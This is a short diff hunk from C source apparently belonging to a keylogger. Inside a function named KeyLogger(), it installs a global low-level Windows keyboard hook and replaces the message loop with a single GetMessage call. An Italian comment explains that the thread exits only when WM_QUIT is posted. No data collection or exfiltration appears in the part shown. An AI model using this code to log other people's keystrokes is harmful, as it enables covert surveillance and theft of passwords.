@@ -217,12 +217,10 @@ DWORD WINAPI KeyLogger()
 	//hMouseHook = SetWindowsHookEx(WH_MOUSE_LL,(HOOKPROC)RawInputMouse, hExe, 0);
 	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInputKeyboard, hExe, 0);
 	MSG msg;
-
-	while (GetMessage(&msg, NULL, 0, 0) != 0)
-	{
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
+	
+	//Loop infinito, per uscire da qui si può solo fare
+	//PostThreadMessage("ID DEL THREAD", WM_QUIT, 0, 0);
+	GetMessage(&msg, NULL, 0, 0);
 
 	return 0;
 }
